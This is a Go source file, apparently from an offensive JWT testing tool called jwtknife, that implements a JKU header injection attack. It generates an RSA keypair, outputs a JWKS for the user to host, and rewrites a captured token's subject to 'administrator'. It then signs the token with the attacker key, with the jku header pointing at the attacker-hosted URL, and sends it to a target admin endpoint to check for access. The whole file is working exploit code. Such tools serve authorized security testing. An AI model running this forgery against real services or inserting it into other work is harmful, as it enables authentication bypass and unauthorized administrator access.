package jwt

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"

	jwtlib "github.com/golang-jwt/jwt/v5"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/report"
)

type JKUHeaderAttack struct {
	priv *rsa.PrivateKey
	kid  string
	jwks string
}

func NewJKUAttack() *JKUHeaderAttack {
	return &JKUHeaderAttack{}
}

func NewJKUHeaderAttack() *JKUHeaderAttack {
	return NewJKUAttack()
}

func (a *JKUHeaderAttack) Name() string {
	return "jku-header-injection"
}

func (a *JKUHeaderAttack) ensureKeypair() error {
	if a.priv != nil {
		return nil
	}

	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	kid := kidFromRSAPub(&priv.PublicKey)

	jwk := map[string]any{
		"kty": "RSA",
		"kid": kid,
		"e":   "AQAB",
		"n":   base64.RawURLEncoding.EncodeToString(priv.PublicKey.N.Bytes()),
	}
	jwks := map[string]any{
		"keys": []any{jwk},
	}

	jwksJSON, _ := json.MarshalIndent(jwks, "", "  ")

	a.priv = priv
	a.kid = kid
	a.jwks = string(jwksJSON)
	return nil
}

func (a *JKUHeaderAttack) Run(in AttackInput) report.AttackResult {
	res := report.NewAttackResult(a.Name())
	res.Outcome = report.OutcomeInteresting

	if err := a.ensureKeypair(); err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	// Parse token without verification
	parser := jwtlib.NewParser(jwtlib.WithoutClaimsValidation())
	tok, _, err := parser.ParseUnverified(in.RawJWT, jwtlib.MapClaims{})
	if err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	claims, ok := tok.Claims.(jwtlib.MapClaims)
	if !ok {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, "claims not MapClaims")
		return res
	}

	claims["sub"] = "administrator"

	// Always emit JWKS hosting instructions
	res.Steps = append(res.Steps, report.Step{
		Label:   "host-jwks",
		Details: "Save EXACTLY as jwks.json and host it. Then provide the FULL URL.",
		JWT:     report.JWTInfo{Token: a.jwks},
	})

	if in.Callback == "" {
		res.Note = "Waiting for hosted JWKS URL"
		return res
	}

	// Forge JWT
	newTok := jwtlib.NewWithClaims(jwtlib.SigningMethodRS256, claims)

	delete(newTok.Header, "jwk")
	newTok.Header["kid"] = a.kid
	newTok.Header["jku"] = in.Callback

	forged, err := newTok.SignedString(a.priv)
	if err != nil {
		res.Outcome = report.OutcomeError
		res.Errors = append(res.Errors, err.Error())
		return res
	}

	res.Steps = append(res.Steps, report.Step{
		Label:   "forged-jku-jwt",
		Details: "JWT signed with attacker key; jku+kid headers set",
		JWT:     report.JWTInfo{Token: forged},
	})

	if in.Client != nil && in.Targets.AdminURL != "" {
		httpRes := in.Client.Do(httpx.RequestPlan{
			Label:     "admin-jku",
			URL:       in.Targets.AdminURL,
			Method:    "GET",
			JWT:       forged,
			Placement: in.Targets.Placement,
		})

		res.Steps = append(res.Steps, report.Step{
			Label: "admin-with-forged-jku",
			HTTP:  report.FromHTTPResult(httpRes),
		})

		if httpRes.Status == 302 || (httpRes.Status >= 200 && httpRes.Status < 400) {
			res.Outcome = report.OutcomeSuccess
			res.Note = "Admin access successful"
			return res
		}

		res.Outcome = report.OutcomeNoEffect
		res.Note = "No admin access"
	}

	return res
}

func kidFromRSAPub(pub *rsa.PublicKey) string {
	h := sha1.New()
	h.Write(pub.N.Bytes())
	h.Write([]byte{0x01, 0x00, 0x01})
	s := hex.EncodeToString(h.Sum(nil))
	if len(s) > 16 {
		return s[:16]
	}
	return s
}
